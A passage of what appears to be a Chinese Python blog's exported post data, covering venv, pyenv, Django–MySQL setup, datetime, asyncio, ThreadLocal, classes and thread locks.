Version---------- -------pip 19.2.3setuptools 41.2.0wheel 0.33.6 下面正常安装各种第三方包，并运行python命令： 12345(venv)$ pip install jinja2...Successfully installed jinja2-2.7.3 markupsafe-0.23(venv)$ python myapp.py... 在venv环境下，用pip安装的包都被安装到venv这个环境下，系统Python环境不受任何影响。也就是说，venv环境是专门针对myproject这个应用创建的。 4 退出隔离环境退出当前的venv环境，使用deactivate命令： 12(venv)$ deactivate $ 此时就回到了正常的环境，现在pip或python均是在系统Python环境下执行。 完全可以针对每个应用创建独立的Python运行环境，这样就可以对每个应用的Python环境进行隔离。 virtualenv是如何创建“独立”的Python运行环境的呢？原理很简单，就是把系统Python复制一份到virtualenv的环境，用命令source venv/bin/activate进入一个virtualenv环境时，virtualenv会修改相关环境变量，让命令python和pip均指向当前的virtualenv环境。 Reference https://virtualenv.pypa.io/en/latest/ virtualenv - https://www.liaoxuefeng.com/wiki/1016959663602400/1019273143120480 Installing packages using pip and virtual environments - https://packaging.python.org/guides/installing-using-pip-and-virtual-environments/","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】Django - 连接 MySQL","date":"2019-10-08T13:45:37.000Z","path":"2019/10/08/【Django】连接MySQL/","text":"MySQLdb（MySQL-python）MySQL-python 又叫 MySQLdb，是 Python 连接 MySQL 最流行的一个驱动，很多框架都也是基于此库进行开发，遗憾的是它只支持 Python2.x，而且安装的时候有很多前置条件，因为它是基于C开发的库，在 Windows 平台安装非常不友好，经常出现失败的情况，现在基本不推荐使用，取代的是它的衍生版本。 123456# 前置条件sudo apt-get install python-dev libmysqlclient-dev # Ubuntusudo yum install python-devel mysql-devel # Red Hat / CentOS# 安装pip install MySQL-python 安装完依赖，直接使用pip安装，MySQLdb模块的名字在pip上叫MySQL-python。 1$ pip install MySQL-python mysqlclient由于 MySQL-python 年久失修，后来出现了它的 Fork 版本 mysqlclient，完全兼容 MySQLdb，同时支持 Python3.x，是 Django ORM的依赖工具，如果你想使用原生 SQL 来操作数据库，那么推荐此驱动。安装方式和 MySQLdb 是一样的。 123456789# Windows安装pip install some-package.whl# linux 前置条件sudo apt-get install python3-dev # debian / Ubuntusudo yum install python3-devel # Red Hat / CentOSbrew install mysql-connector-c # macOS (Homebrew)pip install mysqlclient PyMySQLPyMySQL是一个纯Python写的MySQL客户端，它的目标是替代MySQLdb，可以在CPython、PyPy、IronPython和Jython环境下运行。PyMySQL在MIT许可下发布。 步骤1 安装 pymysql1$ pip install pymysql 2 修改 settings.py12345678910DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.mysql', 'NAME': 'django', #数据库名字 'USER': 'root', #账号 'PASSWORD': '123456', #密码 'HOST': '127.0.0.1', #IP 'PORT': '3306', #端口 &#125;&#125; 3 init.py里面导入pymysql模块1234# [your app in your project]/init.pyimport pymysqlpymysql.install_as_MySQLdb() Reference https://docs.djangoproject.com/en/2.2/ref/databases/","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Python】杂 - 通过 pyenv 快速切换当前系统 Python 版本","date":"2019-10-06T14:03:41.000Z","path":"2019/10/06/【Python】杂-通过-pyenv-快速切换-Python-版本/","text":"BackgroundUnderstanding PATHWhen you run a command like python or pip, your operating system searches through a list of directories to find an executable file with that name. This list of directories lives in an environment variable called PATH, with each directory in the list separated by a colon: 1/usr/local/bin:/usr/bin:/bin Directories in PATH are searched from left to right, so a matching executable in a directory at the beginning of the list takes precedence over another one at the end. In this example, the /usr/local/bin directory will be searched first, then /usr/bin, then /bin. 介绍pyenv 是 Python 版本管理工具。 pyenv 可以改变全局的 Python 版本，安装多个版本的 Python， 设置目录级别的 Python 版本，还能创建和管理 virtual python environments 。所有的设置都是用户级别的操作，不需要 sudo 命令。 pyenv 主要用来管理 Python 的版本，比如一个项目需要 Python 2.x ，一个项目需要 Python 3.x 。 而 virtualenv 主要用来管理 Python 包的依赖，不同项目需要依赖的包版本不同，则需要使用虚拟环境。 pyenv 通过系统修改环境变量来实现 Python 不同版本的切换。而 virtualenv 通过将 Python 包安装到一个目录来作为 Python 包虚拟环境，通过切换目录来实现不同包环境间的切换。 pyenv 的美好之处在于，它并没有使用将不同的 PATH植入不同的shell这种高耦合的工作方式，而是简单地在PATH 的最前面插入了一个垫片路径（shims）：~/.pyenv/shims:/usr/local/bin:/usr/bin:/bin。所有对 Python 可执行文件的查找都会首先被这个 shims 路径截获，从而使后方的系统路径失效。 步骤1 pyenv1234$ brew update$ brew install pyenv$ pyenv -vpyenv 1.2.5 2 安装并管理多个Python：123456$ pyenv install 2.7.15$ pyenv install 3.7.0$ pyenv versions system 2.7.15* 3.7.0 (set by /Users/john/.pyenv/version) 注：星号指定当前的版本 3 切换版本：1234567$ pyenv global 2.7.15$ pyenv versions system* 2.7.15 (set by /Users/john/.pyenv/version) 3.7.0$ python --versionPython 2.7.15 pyenv常用的命令说明： 12345678910111213使用方式: pyenv &lt;命令&gt; [&lt;参数&gt;]命令: commands 查看所有命令 local 设置或显示本地的Python版本 global 设置或显示全局Python版本 shell 设置或显示shell指定的Python版本 install 安装指定Python版本 uninstall 卸载指定Python版本) version 显示当前的Python版本及其本地路径 versions 查看所有已经安装的版本 which 显示安装路径复制代码 注：使用local、global、shell，设置Python版本时需要跟上参数（版本号），查看则不需要。 Reference 使用 pyenv 管理 Python 版本 - http://einverne.github.io/post/2017/04/pyenv.html","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】杂 - macOS 下设置 Python 默认版本","date":"2019-10-06T13:48:42.000Z","path":"2019/10/06/【Python】杂-macOS-下设置-Python-默认版本/","text":"步骤1 修改可执行文件路径打开配置文件，指定 python 命令对应的可执行文件路径： 1$ open ~/.bash_profile 增加以下： 1234export PATH=$&#123;PATH&#125;:/usr/local/Cellar/python/3.7.4_1/binalias python=\"/usr/local/Cellar/python/3.7.4_1/bin/python3.7\"alias p3=\"/usr/local/Cellar/python/3.7.4_1/bin/python3.7\"alias p2=\"/usr/bin/python2.7\" 注意，如果是使用 oh-my-zsh，则也需要修改添加以上内容到 ~/.zshrc中。 2 配置文件生效1$ source ~/.bash_profile Note~/.bashrc，~/.bash_profile 的区别： ~/.bash_profile：每个用户都可使用该文件输入专用于自己使用的shell信息。仅在用户登录（直接使用物理机器登录，或者通过 ssh 进行登录）时，该文件会被执行一次。 ~/.bashrc：该文件包含专用于你的bash shell的bash信息。当进行用户登录或者每次打开新的shell时，该文件都会被执行 3 验证使用python命令查看： 12345$ pythonPython 2.7.15 (default, Aug 22 2018, 16:36:18)[GCC 4.2.1 Compatible Apple LLVM 9.1.0 (clang-902.0.39.2)] on darwinType \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; Reference What is the difference between .bash_profile and .bashrc? - https://medium.com/@kingnand.90/what-is-the-difference-between-bash-profile-and-bashrc-d4c902ac7308","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】API - 时间表示","date":"2019-10-06T13:41:02.000Z","path":"2019/10/06/【Python】API-时间表示/","text":"表示时间总共有 3 个相关的类 datetime.date：表示日期，Attributes: year, month, and day。 datetime.time：表示时间，Attributes: hour, minute, second, microsecond, and tzinfo。 datetime.dateime：表示日期和时间，Attributes: year, month, day, hour, minute, second, microsecond, and tzinfo。 datetime.timedelta：表示一个时间的差值 Import123&gt;&gt;&gt; import time as xtime# datetime.timezone was added in Python 3.2, So it is normal to get an import error in e.g. Python 2.7.&gt;&gt;&gt; from datetime import datetime, date, time, timezone, timedelta Unix TimeStamp12345678import datetime, time#获取当前时间戳的整数格式，例如：1553669254ctime=int(time.time())timestamp = time.time()datetime.datetime.utcfromtimestamp(timestamp) #根据时间戮创建一个UTC datetime对象datetime.datetime.fromtimestamp(time.time()) #根据时间戮创建一个 datetime对象 从字符串中解析出datetime 对象12345&gt;&gt;&gt; dt = datetime.fromisoformat(&apos;2018-09-22&apos;)&gt;&gt;&gt; dt = datetime.fromisoformat(&apos;2018-09-22 16:28:22&apos;)&gt;&gt;&gt; dt = datetime.fromisoformat(&apos;2018-09-22 16:28:22.666&apos;)&gt;&gt;&gt; dt = datetime.fromisoformat(&apos;2018-09-22 16:28:22.666+08:00&apos;)&gt;&gt;&gt; dt = datetime.strptime(&apos;2018-09-22 16:28:22&apos;, &apos;%Y-%m-%d %H:%M:%S&apos;) 指定 datetime 输出格式12&gt;&gt;&gt; end_date = datetime.datetime.strptime(&apos;2019-10-06&apos;,&apos;%Y-%m-%d&apos;)&gt;&gt;&gt; start_date = datetime.datetime.strptime(&apos;2019-10-06&apos;,&apos;%Y-%m-%d %H:%M:%S&apos;) datetime时间对象实例化123456789101112131415161718# 构造 datetime(year, month, day, hour=0, minute=0, second=0, microsecond=0, tzinfo=None, *, fold=0)&gt;&gt;&gt; datetime(2018, 9, 22, 16, 28, 22)&gt;&gt;&gt; datetime.today() # 不包含时区信息的当前时间（Naive time）datetime.datetime(2019, 10, 19, 10, 23, 38, 117425)&gt;&gt;&gt; datetime.now() # 不包含时区信息的当前时间（当不传入 tz 参数时，和datetime.today()没有区别）datetime.datetime(2019, 10, 19, 10, 23, 38, 117425)&gt;&gt;&gt; china_tz = timezone(timedelta(hours=8), 'Asia/Shanghai')&gt;&gt;&gt; datetime.now(china_tz) # 指定时区对应的当前时间&gt;&gt;&gt; datetime.utcnow() # 不包含时区信息的当前 UTC 时间datetime.datetime(2019, 10, 20, 5, 7, 23, 190797)&gt;&gt;&gt; dt = datetime.combine(date.today(), time(16, 28, 22))&gt;&gt;&gt; dt = datetime.combine(date.today(), time(16, 28, 22), china_tz)&gt;&gt;&gt; dt = datetime.fromordinal(736959) # datetime.min以来的天数 datetime对象的类属性1234# 类属性&gt;&gt;&gt; datetime.min # 0001-01-01 00:00:00&gt;&gt;&gt; datetime.max # 9999-12-31 23:59:59.999999&gt;&gt;&gt; datetime.resolution # 0:00:00.000001 datetime对象的实例属性12345678910&gt;&gt;&gt; dt = datetime(2018, 9, 22, 16, 28, 22, 999, china_tz)&gt;&gt;&gt; dt.year # 2018&gt;&gt;&gt; dt.month # 9&gt;&gt;&gt; dt.day # 22&gt;&gt;&gt; dt.hour # 16&gt;&gt;&gt; dt.minute # 28&gt;&gt;&gt; dt.second # 22&gt;&gt;&gt; dt.microsecond # 999&gt;&gt;&gt; dt.tzinfo # Asia/Shanghai&gt;&gt;&gt; dt.fold # 0 datetime对象的方法1234567891011121314151617# 方法print(dt.date()) # 2018-09-22print(dt.time()) # 16:28:22.000999print(dt.timetz()) # 16:28:22.000999+08:00print(dt.toordinal()) # 736959print(dt.timestamp()) # 1537604902.000999print(dt.weekday()) # Monday is 0 and Sunday is 6print(dt.isoweekday()) # Monday is 1 and Sunday is 7print(dt.isoformat()) # 2018-09-22T16:28:22.000999+08:00print(dt.ctime()) # Sat Sep 22 16:28:22 2018print(dt.strftime('%Y-%m-%d %H:%M:%S')) # 2018-09-22 16:28:22print(dt.tzname()) # 时区名print(dt.utcoffset()) # 相对 UTC 时差print(dt.dst()) # 转换为夏令时print(dt.timetuple()) # 转成 time.struct_time print(dt.utctimetuple()) # 转成 time.struct_time print(dt.astimezone(timezone.utc)) # 时区转换 比较时间1234dt1 = datetime(2018, 9, 22, 16, 28, 22)dt2 = datetime(2018, 9, 22, 16, 28, 23)if dt1 &lt; dt2: print(f'&#123;dt1&#125; is before &#123;dt2&#125;') 可能出的问题上面的本地时间（datetime.datetime.today()），从底层 API实现来说，它会获取本地机器的时间。 而 UTC 时间（datetime.datetime.utcnow()），从底层 API实现来说，其实是在获取本地机器的时间后，根据当前机器设置的时区信息，计算出 UTC 时间。 这意味着，如果你直接修改了本地机器的时间，则通过 Python API 获取到的时间就会是错误的。 Reference datetime — Basic date and time types - https://docs.python.org/3/library/datetime.html Python 日期模块 – datetime - https://blog.csdn.net/shangboerds/article/details/82817901","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【MySQL】MySQL 8 + macOS 错误：Authentication plugin 'caching_sha2_password' cannot be loaded","date":"2019-10-06T13:38:58.000Z","path":"2019/10/06/【MySQL】MySQL-8-macOS-错误：Authentication-plugin-caching-sha2-password-cannot-be-loaded/","text":"错误信息Authentication plugin ‘caching_sha2_password’ cannot be loaded: dlopen(/usr/local/mysql/lib/plugin/caching_sha2_password.so, 2): image not found 这是 MySQL 的问题，不是客户端问题，所以不管是用 Navicat Premium 还是 Sequel Pro 连接 MySQL，会碰到一样的错误。 解决方法1ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED WITH mysql_native_password BY &apos;yourpassword&apos;; Reference https://1c7.me/mysql-8-connect-error-2018/","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【Python】I/O - 异步 I/O","date":"2019-09-24T04:06:38.000Z","path":"2019/09/24/【Python】IO-异步-IO/","text":"asyncioasyncio是Python 3.4版本引入的标准库，直接内置了对异步IO的支持。 asyncio的编程模型就是一个消息循环。我们从asyncio模块中直接获取一个EventLoop的引用，然后把需要执行的协程扔到EventLoop中执行，就实现了异步IO。 用asyncio实现Hello world代码如下： 1234567891011121314import asyncio@asyncio.coroutinedef hello(): print(\"Hello world!\") # 异步调用asyncio.sleep(1): r = yield from asyncio.sleep(1) print(\"Hello again!\")# 获取EventLoop:loop = asyncio.get_event_loop()# 执行coroutineloop.run_until_complete(hello())loop.close() @asyncio.coroutine把一个generator标记为coroutine类型，然后，我们就把这个coroutine扔到EventLoop中执行。 hello()会首先打印出Hello world!，然后，yield from语法可以让我们方便地调用另一个generator。由于asyncio.sleep()也是一个coroutine，所以线程不会等待asyncio.sleep()，而是直接中断并执行下一个消息循环。当asyncio.sleep()返回时，线程就可以从yield from拿到返回值（此处是None），然后接着执行下一行语句。 把asyncio.sleep(1)看成是一个耗时1秒的IO操作，在此期间，主线程并未等待，而是去执行EventLoop中其他可以执行的coroutine了，因此可以实现并发执行。 我们用Task封装两个coroutine试试： 12345678910111213import threadingimport asyncio@asyncio.coroutinedef hello(): print('Hello world! (%s)' % threading.currentThread()) yield from asyncio.sleep(1) print('Hello again! (%s)' % threading.currentThread())loop = asyncio.get_event_loop()tasks = [hello(), hello()]loop.run_until_complete(asyncio.wait(tasks))loop.close() 观察执行过程： 12345Hello world! (&lt;_MainThread(MainThread, started 140735195337472)&gt;)Hello world! (&lt;_MainThread(MainThread, started 140735195337472)&gt;)(暂停约1秒)Hello again! (&lt;_MainThread(MainThread, started 140735195337472)&gt;)Hello again! (&lt;_MainThread(MainThread, started 140735195337472)&gt;) 由打印的当前线程名称可以看出，两个coroutine是由同一个线程并发执行的。 如果把asyncio.sleep()换成真正的IO操作，则多个coroutine就可以由一个线程并发执行。 我们用asyncio的异步网络连接来获取sina、sohu和163的网站首页： 12345678910111213141516171819202122import asyncio@asyncio.coroutinedef wget(host): print('wget %s...' % host) connect = asyncio.open_connection(host, 80) reader, writer = yield from connect header = 'GET / HTTP/1.0\\r\\nHost: %s\\r\\n\\r\\n' % host writer.write(header.encode('utf-8')) yield from writer.drain() while True: line = yield from reader.readline() if line == b'\\r\\n': break print('%s header &gt; %s' % (host, line.decode('utf-8').rstrip())) # Ignore the body, close the socket writer.close()loop = asyncio.get_event_loop()tasks = [wget(host) for host in ['www.sina.com.cn', 'www.sohu.com', 'www.163.com']]loop.run_until_complete(asyncio.wait(tasks))loop.close() 执行结果如下： 12345678910111213141516wget www.sohu.com...wget www.sina.com.cn...wget www.163.com...(等待一段时间)(打印出sohu的header)www.sohu.com header &gt; HTTP/1.1 200 OKwww.sohu.com header &gt; Content-Type: text/html...(打印出sina的header)www.sina.com.cn header &gt; HTTP/1.1 200 OKwww.sina.com.cn header &gt; Date: Wed, 20 May 2015 04:56:33 GMT...(打印出163的header)www.163.com header &gt; HTTP/1.0 302 Moved Temporarilywww.163.com header &gt; Server: Cdn Cache Server V2.0... 可见3个连接由一个线程通过coroutine并发完成。 async和await用asyncio提供的@asyncio.coroutine可以把一个generator标记为coroutine类型，然后在coroutine内部用yield from调用另一个coroutine实现异步操作。 为了简化并更好地标识异步IO，从Python 3.5开始引入了新的语法async和await，可以让coroutine的代码更简洁易读。 请注意，async和await是针对coroutine的新语法，要使用新的语法，只需要做两步简单的替换： 把@asyncio.coroutine替换为async； 把yield from替换为await。 让我们对比一下上一节的代码： 12345@asyncio.coroutinedef hello(): print(\"Hello world!\") r = yield from asyncio.sleep(1) print(\"Hello again!\") 用新语法重新编写如下： 1234async def hello(): print(\"Hello world!\") r = await asyncio.sleep(1) print(\"Hello again!\") 剩下的代码保持不变。 Reference asyncio - https://www.liaoxuefeng.com/wiki/1016959663602400/1017970488768640","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】线程 - ThreadLocal","date":"2019-09-24T03:48:10.000Z","path":"2019/09/24/【Python】线程-ThreadLocal/","text":"ThreadLocal123456789101112131415161718192021import threading # 创建全局ThreadLocal对象:local_school = threading.local()def process_student(): # 获取当前线程关联的student: std = local_school.student print('Hello, %s (in %s)' % (std, threading.current_thread().name))def process_thread(name): # 绑定ThreadLocal的student: local_school.student = name process_student()t1 = threading.Thread(target= process_thread, args=('Alice',), name='Thread-A')t2 = threading.Thread(target= process_thread, args=('Bob',), name='Thread-B')t1.start()t2.start()t1.join()t2.join() 执行结果： 12Hello, Alice (in Thread-A)Hello, Bob (in Thread-B) 全局变量local_school就是一个ThreadLocal对象，每个Thread对它都可以读写student属性，但互不影响。你可以把local_school看成全局变量，但每个属性如local_school.student都是线程的局部变量，可以任意读写而互不干扰，也不用管理锁的问题，ThreadLocal内部会处理。 可以理解为全局变量local_school是一个dict，不但可以用local_school.student，还可以绑定其他变量，如local_school.teacher等等。 ThreadLocal最常用的地方就是为每个线程绑定一个数据库连接，HTTP请求，用户身份信息等，这样一个线程的所有调用到的处理函数都可以非常方便地访问这些资源。 Reference ThreadLocal - https://www.liaoxuefeng.com/wiki/1016959663602400/1017630786314240","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】Basics - 类","date":"2019-09-23T13:47:01.000Z","path":"2019/09/23/【Python】Basics-类/","text":"类定义12345678&gt;&gt;&gt; class Complex(object):... def __init__(self, realpart, imagpart):... self.r = realpart... self.i = imagpart...&gt;&gt;&gt; x = Complex(3.0, -4.5)&gt;&gt;&gt; x.r, x.i(3.0, -4.5) class后面紧接着是类名，即Complex，类名通常是大写开头的单词，紧接着是(object)，表示该类是从哪个类继承下来的。 通常，如果没有合适的继承类，就使用object类，这是所有类最终都会继承的类。 __init__其实就是构造函数（constrctor）。注意到__init__方法的第一个参数永远是self，表示创建的实例本身，因此，在__init__方法内部，就可以把各种属性绑定到self，因为self就指向创建的实例本身。 Python2 中定义类时要不要继承 object12345678910111213141516171819class Person: \"\"\" 不带object \"\"\" name = \"zhengtong\" class Animal(object): \"\"\" 带有object \"\"\" name = \"chonghong\" if __name__ == \"__main__\": x = Person() print \"Person\", dir(x) y = Animal() print \"Animal\", dir(y) 运行结果： 123Person ['__doc__', '__module__', 'name']Animal ['__class__', '__delattr__', '__dict__', '__doc__', '__format__', '__getattribute__', '__hash__', '__init__', '__module__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'name'] Person类很明显能够看出区别，不继承object对象，只拥有了doc , module 和 自己定义的name变量，也就是说这个类的命名空间只有三个对象可以操作。 Animal类继承了object对象，拥有了好多可操作对象，这些都是类中的高级特性。 实际上在python 3 中已经默认就帮你加载了object了（即便你没有写上object）。 类中的变量实例变量123456class Kls(object): def __inti__(self): self.data = 1 def printd(self): print(self.data) 通过self 来声明并为一个类对象的实例变量赋值。 类变量可以直接在class中定义属性，这种属性是类属性，归Student类所有： 12345class Student(object): name = 'Student' def get_class_name(self): return Student.name 当我们定义了一个类属性后，这个属性虽然归类所有，但类的所有实例都可以访问到。来测试一下： 12345678910111213&gt;&gt;&gt; Student.name # 打印类的name属性Student&gt;&gt;&gt; s = Student() # 创建实例s&gt;&gt;&gt; print(s.name) # 打印name属性，因为实例并没有name属性，所以会继续查找class的name属性Student&gt;&gt;&gt; s.name = 'Michael' # 给实例绑定name属性&gt;&gt;&gt; print(s.name) # 由于实例属性优先级比类属性高，因此，它会屏蔽掉类的name属性Michael&gt;&gt;&gt; print(Student.name) # 但是类属性并未消失，用Student.name仍然可以访问Student&gt;&gt;&gt; del s.name # 如果删除实例的name属性&gt;&gt;&gt; print(s.name) # 再次调用s.name，由于实例的name属性没有找到，类的name属性就显示出来了Student 结论 类变量可以用 类名.类变量 或者 self.类变量 两种中任何一种方式访问，但不建议使用后者这种方式。 类变量是所有对象所共享的，无论任何时候都建议用类名的方式访问类变量。 实例变量在类内部用 self 访问（self.name），在类外部通过类实例对象来访问（s.name）。 类变量在类内部或者类外部都用类名来访问（Student.name）。 全局变量在Python的变量使用中，经常会遇到这样的错误： 1local variable 'a' referenced before assignment 它的意思是：局部变量“a”在赋值前就被引用了。这其实是因为，在默认情况下，任何被赋值（a = …）的变量都是一个局部变量（local variable）， 比如运行下面的代码就会出现这样的问题： 12345a = 3def Fuc(): print (a) a = a + 1Fuc() 但是如果把 a = a + 1 这一句删除又不会出现上述问题了 1234a = 3def Fuc(): print (a)Fuc() 原来，在Python中，a = 3 定义了一个变量a，其作用域从定义处到代码结束。换句话说，在 a=3 以下的代码中均可以访问到该变量a，但如果要在子函数中修改该变量，则需要在子函数中将该变量声明为全局变量（通过 global 关键字）。 123456a = 3def Fuc(): global a print (a) a=a+1Fuc() 总结，要在哪个函数中修改一个变量，则需在该函数中将该变量声明为全局变量。 但是有一个函数特殊，那就是主函数： 12345678910a = 3def Fuc(): global a print (a) # 1 a = a + 1if name == \"main\": print (a) # 2 a = a + 1 Fuc() print (a) # 3 输出如下（Python3环境下）： 123345 三个print执行的顺序为：2, 1, 3 。可以看到主函数中并没有通过 global 关键字重新声明变量a，而仍然可以修改变量a。而在普通函数中，需要通过 global 关键字以将变量a 声明为全局变量，才可以修改它。 静态变量123456789101112131415161718192021class Foo(object): _count = 0 # 不要直接操作这个变量，也尽量避免访问它 def add(self): Foo._count += 1f1 = Foo()f2 = Foo()print(f1._count)print(f2._count)print(Foo._count)f1.add()print(f1._count)print(f2._count)print(Foo._count)# 结果:# 0 0 0# 1 1 1 可以借助@property装饰器实现通过使用getter和setter进行包装： 123456789101112131415161718192021class Foo(object): _count = 0 # 不要直接操作这个变量，也尽量避免访问它 @property def count(self): return Foo._count @count.setter def count(self, num): Foo._count = numf1 = Foo()f2 = Foo()print f1.count, f1._count, f2.count, f2._countf1.count = 1print f1.count, f1._count, f2.count, f2._count# 结果:# 0 0 0 0# 1 1 1 1 私有变量 类似__xx，以双下划线开头的实例变量名，就变成了一个私有变量（private），只有在类的内部通过 self__xx 可以访问，在类外部通过类的实例（对象）不能访问； 类似__xx__，以双下划线开头，并且以双下划线结尾的是特殊变量，特殊变量是可以直接访问的，它不是private变量； 类似_x，以单下划线开头的实例变量名，这样的变量在类外部通过类的实例（对象）是可以访问的。但是，按照约定俗成的规定，当你看到这样的变量时，意思就是，“虽然我可以被访问，但是请把我视为私有变量，不要随意访问”。 实验： 123456789class A(): def __init__(self): self._a = 1 self.__b = 2a = A()print a._a# print a.__b # 报错 AttributeError: A instance has no attribute '__b' 类中的方法实例方法（Instance Method）Python 的实例方法用得最多，也最常见。我们先来看 Python 的实例方法。 12345678910111213class Kls(object): def __init__(self, data): self.data = data def printd(self): # 实例方法，必须传入自身实例（self）作为参数 print(self.data)ik1 = Kls('leo')ik2 = Kls('lee')ik1.printd()ik2.printd() 静态方法（Static Method）和类方法（Class Method）一般来说，要使用某个类的方法，需要先实例化出一个对象后，才能调用这个对象中的方法。 而使用@staticmethod或@classmethod，就可以不需要实例化，直接类名.方法名()来调用。 这有利于组织代码，把某些应该属于某个类的方法给放到那个类里去，同时有利于命名空间的整洁。 既然@staticmethod和@classmethod都可以直接类名.方法名()来调用，那他们有什么区别呢 从它们的使用上来看, @staticmethod不需要 self 参数（表示自身对象）和 cls参数（表示自身类），就跟使用函数一样。 @classmethod也不需要self参数，但第一个参数一定是 cls（表示自身类）。 如果在@staticmethod中要调用到这个类的一些属性或者方法，只能直接类名.属性名或类名.方法名()。 而@classmethod因为持有cls参数，可以来调用类的属性，类的方法，实例化对象等，避免硬编码。 12345678910111213141516171819202122232425262728293031323334class A(object): bar = 1 def foo(self): print 'foo' @staticmethod def static_foo(): print 'static_foo' print A.bar @classmethod def class_foo(cls): # 类方法，传入类实例 print 'class_foo' print cls.bar cls().foo()a = A()a.foo()# output# fooA.foo(a) # 这种调用方式的调用副作用（产生的效果）和 a.foo() 完全相同# output# fooA.static_foo()# output# static_foo# 1A.class_foo()# output# class_foo# 1# foo 访问修饰符（Access Modifiers）在 Python 中，只有 public 和 private 两种可见性（visibility）。 如果你想把一个域的访问级别设置为仅仅能在类中被访问，则将其命名为”__xx“即可，比如： 1234567891011121314151617181920class Test: def __init__(self, foo): self.__foo = foo def __bar(self): print(self.__foo) print('__bar')def main(): test = Test('hello') # AttributeError: 'Test' object has no attribute '__bar' test.__bar() # AttributeError: 'Test' object has no attribute '__foo' print(test.__foo)if __name__ == \"__main__\": main() Reference Python 全局变量与global关键字 - https://blog.csdn.net/songyunli1111/article/details/76095971 飘逸的python - @staticmethod和@classmethod的作用与区别 - https://blog.csdn.net/handsomekang/article/details/9615239 python2中为什么在进行类定义时最好要加object，不加又怎样 - https://blog.csdn.net/hellojoy/article/details/79481030 https://www.cnblogs.com/chenny7/p/7338502.html","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】线程 - 锁","date":"2019-09-23T13:36:05.000Z","path":"2019/09/23/【Python】线程-锁/","text":"Situation在多进程中，同一个变量，各自有一份拷贝存在于每个进程中，互不影响。而在多线程中，变量可以被多个线程共享，所以，被共享的变量可以被任何一个线程修改，因此，线程之间的共享数据最大的危险在于多个线程可以同时对它进行修改。 来看看多个线程同时操作一个共享变量，最终因为多线程的交替执行（interleaving），导致数据不一致的情况： 12345678910111213141516171819202122import time, threading# 假定这是你的银行存款:balance = 0def change_it(n): # 先存后取，结果应该为0: global balance balance = balance + n balance = balance - ndef run_thread(n): for i in range(100000): change_it(n)t1 = threading.Thread(target=run_thread, args=(5,))t2 = threading.Thread(target=run_thread, args=(8,))t1.start()t2.start()t1.join()t2.join()print(balance) 我们定义了一个共享变量balance，初始值为0，并且启动两个线程，先存后取，理论上结果应该为0，但是，由于线程的调度是由操作系统决定的，当t1、t2交替执行时，只要循环次数足够多，balance的结果就不一定是0了。 原因是因为高级语言的一条语句在CPU执行时是若干条语句，即使一个简单的计算： 1balance = balance + n 也分两步： 计算balance + n，存入临时变量中； 将临时变量的值赋给balance。 也就是可以看成： 12x = balance + nbalance = x 由于x是局部变量，两个线程各自都有自己的x，当代码正常执行时： 12345678910111213初始值 balance = 0t1: x1 = balance + 5 # x1 = 0 + 5 = 5t1: balance = x1 # balance = 5t1: x1 = balance - 5 # x1 = 5 - 5 = 0t1: balance = x1 # balance = 0t2: x2 = balance + 8 # x2 = 0 + 8 = 8t2: balance = x2 # balance = 8t2: x2 = balance - 8 # x2 = 8 - 8 = 0t2: balance = x2 # balance = 0 结果 balance = 0 但是t1和t2是交替运行的，如果操作系统以下面的顺序执行t1、t2： 123456789101112131415初始值 balance = 0t1: x1 = balance + 5 # x1 = 0 + 5 = 5t2: x2 = balance + 8 # x2 = 0 + 8 = 8t2: balance = x2 # balance = 8t1: balance = x1 # balance = 5t1: x1 = balance - 5 # x1 = 5 - 5 = 0t1: balance = x1 # balance = 0t2: x2 = balance - 8 # x2 = 0 - 8 = -8t2: balance = x2 # balance = -8结果 balance = -8 究其原因，是因为修改balance需要多条语句，而执行这几条语句时，线程可能中断，从而导致多个线程把同一个对象的内容改乱了。 两个线程同时一存一取，就可能导致余额不对，你肯定不希望你的银行存款莫名其妙地变成了负数，所以，我们必须确保一个线程在修改balance的时候，别的线程一定不能改。 加锁如果我们要确保balance计算正确，就要给change_it()上一把锁，当某个线程开始执行change_it()时，我们说，该线程因为获得了锁，因此其他线程不能同时执行change_it()，只能等待，直到锁被释放后，获得该锁以后才能改。由于锁只有一个，无论多少线程，同一时刻最多只有一个线程持有该锁，所以，不会造成修改的冲突。创建一个锁就是通过threading.Lock()来实现： 12345678910111213balance = 0lock = threading.Lock()def run_thread(n): for i in range(100000): # 先要获取锁: lock.acquire() try: # 放心地改吧: change_it(n) finally: # 改完了一定要释放锁: lock.release() 当多个线程同时执行lock.acquire()时，只有一个线程能成功地获取锁，然后继续执行代码，其他线程就继续等待直到获得锁为止。 